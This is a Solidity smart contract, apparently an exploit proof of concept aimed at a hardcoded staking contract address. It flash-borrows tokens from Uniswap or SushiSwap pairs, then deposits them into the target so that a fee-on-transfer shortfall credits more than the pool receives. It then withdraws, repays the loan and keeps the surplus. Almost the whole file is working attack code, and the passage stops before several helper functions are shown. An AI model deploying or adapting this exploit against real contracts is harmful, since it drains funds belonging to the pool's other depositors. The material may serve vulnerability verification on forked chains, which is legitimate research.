// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

interface IERC20 {
    function balanceOf(address account) external view returns (uint256);
    function allowance(address owner, address spender) external view returns (uint256);
    function approve(address spender, uint256 amount) external returns (bool);
    function transfer(address to, uint256 amount) external returns (bool);
}

interface IStaking {
    function deposit(address tokenAddress, uint256 amount, address referrer) external;
    function withdraw(address tokenAddress, uint256 amount) external;
    function balanceOf(address user, address token) external view returns (uint256);
}

interface IUniswapV2Factory {
    function getPair(address tokenA, address tokenB) external view returns (address pair);
}

interface IUniswapV2Pair {
    function token0() external view returns (address);
    function token1() external view returns (address);
    function getReserves() external view returns (uint112 reserve0, uint112 reserve1, uint32 blockTimestampLast);
    function swap(uint256 amount0Out, uint256 amount1Out, address to, bytes calldata data) external;
}

contract FlawVerifier {
    address public constant TARGET = 0x245a551ee0F55005e510B239c917fA34b41B3461;

    address private constant WETH = 0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2;
    address private constant USDC = 0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48;
    address private constant USDT = 0xdAC17F958D2ee523a2206206994597C13D831ec7;
    address private constant DAI = 0x6B175474E89094C44Da98b954EedeAC495271d0F;
    address private constant WBTC = 0x2260FAC5E5542a773Aa44fBCfeDf7C193bc2C599;
    address private constant WBTC_SWAPP_LP = 0x5548F847Fd9a1D3487d5fbB2E8d73972803c4Cce;

    address private constant UNISWAP_V2_FACTORY = 0x5C69bEe701ef814a2B6a3EDD4B1652CB9cc5aA6f;
    address private constant SUSHISWAP_FACTORY = 0xC0AEe478e3658e2610c5F7A4A2E1777cE9e4f2Ac;

    string public constant EXPLOIT_PATH_USED =
        "Flash-borrow a non-stable token from a public AMM pair -> call deposit(token, amount, referrer) with the borrowed amount -> exploit a fee-on-transfer/deflationary receive shortfall so staking credits amount while receiving less -> immediately call withdraw(token, amount) to pull the full recorded balance from the pool -> repay the flash-borrow and keep the surplus if the honest pool liquidity covers the shortfall.";

    address private _profitToken;
    uint256 private _profitAmount;

    bool public executed;
    bool public hypothesisValidated;
    bool public hypothesisRefuted;
    bool public profitAchieved;

    string public failureReason;

    address public lastAttemptedToken;
    address public lastAttemptedFactory;
    address public lastAttemptedBase;
    address public lastAttemptedPair;

    uint256 public lastObservedPoolBalance;
    uint256 public lastObservedPairReserve;
    uint256 public lastBorrowAmount;
    uint256 public lastFlashReceived;
    uint256 public lastRequestedDeposit;
    uint256 public lastNetReceivedByStaking;
    uint256 public lastRecordedStake;
    uint256 public lastWithdrawNet;
    uint256 public lastRepayAmount;
    uint256 public lastLeftoverAfterRepay;

    constructor() {}

    function execute() external {
        _run();
    }

    function run() external {
        _run();
    }

    function verify() external {
        _run();
    }

    function profitToken() external view returns (address) {
        return _profitToken;
    }

    function profitAmount() external view returns (uint256) {
        return _profitAmount;
    }

    function attempt(address token, address factory, address base) external {
        require(msg.sender == address(this), "self only");
        _attempt(token, factory, base);
    }

    function _run() internal {
        require(!executed, "already executed");
        executed = true;

        for (uint256 tokenIndex = 0; tokenIndex < _candidateCount(); ++tokenIndex) {
            address token = _candidate(tokenIndex);
            if (_isStable(token)) {
                continue;
            }

            uint256 poolBalance = _balanceOf(token, TARGET);
            if (poolBalance == 0) {
                continue;
            }

            for (uint256 factoryIndex = 0; factoryIndex < 2; ++factoryIndex) {
                address factory = _factory(factoryIndex);
                for (uint256 baseIndex = 0; baseIndex < 5; ++baseIndex) {
                    address base = _base(baseIndex);
                    if (base == token) {
                        continue;
                    }

                    lastAttemptedToken = token;
                    lastAttemptedFactory = factory;
                    lastAttemptedBase = base;
                    lastObservedPoolBalance = poolBalance;

                    try this.attempt(token, factory, base) {
                        if (profitAchieved) {
                            return;
                        }
                    } catch Error(string memory reason) {
                        failureReason = reason;
                    } catch {
                        failureReason = "candidate flash-borrow attempt reverted";
                    }
                }
            }
        }

        if (!hypothesisValidated) {
            hypothesisRefuted = true;
            _profitToken = address(0);
            _profitAmount = 0;
            profitAchieved = false;
            if (bytes(failureReason).length == 0) {
                failureReason = "no candidate non-stable token had both an AMM flash-borrow source and a taxed deposit shortfall against the staking pool at this fork";
            }
            return;
        }

        if (!profitAchieved && bytes(failureReason).length == 0) {
            failureReason = "over-credit was observed, but no positive net token surplus remained after withdrawing and repaying temporary capital";
        }
    }

    function _attempt(address token, address factory, address base) internal {
        address pair = IUniswapV2Factory(factory).getPair(token, base);
        require(pair != address(0), "no AMM pair for candidate/base");

        address token0 = IUniswapV2Pair(pair).token0();
        address token1 = IUniswapV2Pair(pair).token1();
        require(token == token0 || token == token1, "pair mismatch");

        (uint112 reserve0, uint112 reserve1,) = IUniswapV2Pair(pair).getReserves();
        uint256 reserve = token == token0 ? uint256(reserve0) : uint256(reserve1);
        require(reserve > 0, "empty AMM reserve");

        uint256 livePool = _balanceOf(token, TARGET);
        require(livePool > 0, "empty staking pool");

        uint256 borrowAmount = _min(livePool / 10, reserve / 100);
        if (borrowAmount == 0) {
            borrowAmount = _min(livePool / 20, reserve / 200);
        }
        require(borrowAmount > 0, "borrow amount rounds to zero");

        lastAttemptedPair = pair;
        lastObservedPoolBalance = livePool;
        lastObservedPairReserve = reserve;
        lastBorrowAmount = borrowAmount;

        if (token == token0) {
            IUniswapV2Pair(pair).swap(borrowAmount, 0, address(this), abi.encode(token, pair, borrowAmount));
        } else {
            IUniswapV2Pair(pair).swap(0, borrowAmount, address(this), abi.encode(token, pair, borrowAmount));
        }
    }

    function uniswapV2Call(address sender, uint256 amount0, uint256 amount1, bytes calldata data) external {
        require(sender == address(this), "bad callback sender");

        (address token, address pair, uint256 borrowAmount) = abi.decode(data, (address, address, uint256));
        require(msg.sender == pair, "bad pair caller");

        uint256 declaredBorrow = amount0 > 0 ? amount0 : amount1;
        require(declaredBorrow == borrowAmount, "borrow mismatch");

        uint256 tokenBalanceBeforeDeposit = _balanceOf(token, address(this));
        lastFlashReceived = tokenBalanceBeforeDeposit;
        require(tokenBalanceBeforeDeposit > 0, "flash transfer yielded zero tokens");

        uint256 depositAmount = borrowAmount;
        if (depositAmount > tokenBalanceBeforeDeposit) {
            depositAmount = tokenBalanceBeforeDeposit;
        }
        require(depositAmount > 0, "deposit amount is zero");
        lastRequestedDeposit = depositAmount;

        uint256 stakingBalanceBefore = _balanceOf(token, TARGET);
        _forceApprove(token, TARGET, depositAmount);
        IStaking(TARGET).deposit(token, depositAmount, address(0));
        uint256 stakingBalanceAfterDeposit = _balanceOf(token, TARGET);
        uint256 recordedStake = IStaking(TARGET).balanceOf(address(this), token);

        uint256 netReceivedByStaking = stakingBalanceAfterDeposit - stakingBalanceBefore;
        lastNetReceivedByStaking = netReceivedByStaking;
        lastRecordedStake = recordedStake;

        require(recordedStake >= depositAmount, "staking did not credit the requested amount");
        require(netReceivedByStaking < depositAmount, "deposit received the full requested amount");

        hypothesisValidated = true;

        uint256 attackerBalanceBeforeWithdraw = _balanceOf(token, address(this));
        IStaking(TARGET).withdraw(token, depositAmount);
        uint256 attackerBalanceAfterWithdraw = _balanceOf(token, address(this));
        uint256 withdrawNet = attackerBalanceAfterWithdraw - attackerBalanceBeforeWithdraw;
        lastWithdrawNet = withdrawNet;

        uint256 repayAmount = ((borrowAmount * 1000) / 997) + 1;
        lastRepayAmount = repayAmount;
        require(
            attackerBalanceAfterWithdraw >= repayAmount,
            "withdrawal proceeds cannot repay flash-borrow; pool shortfall or outbound token tax blocks profit realization"
        );

        _safeTransfer(token, pair, repayAmount);

        uint256 leftover = _balanceOf(token, address(this));
        lastLeftoverAfterRepay = leftover;

        if (leftover > 0) {
            profitAchieved = true;
            _profitToken = token;
            _profitAmount = leftover;
            failureReason = "";
            return;
        }

        profitAchieved = false;
        _profitToken = address(0);
        _profitAmount = 0;
        failureReason = "over-credit was observed, but the taxed token cycle left no positive net token surplus after flash-borrow repayment";
    }

    function _factory(uint256 index) internal pure returns (address) {
        if (index == 0) return UNISWAP_V2_FACTORY;
        return SUSHISWAP_FACTORY;
    }

    function _base(uint256 index) internal pure returns (address) {
        if (index == 0) return WETH;
        if (index == 1) return USDC;
        if (index == 2) return USDT;
        if (index == 3) return DAI;
        return WBTC;
    }

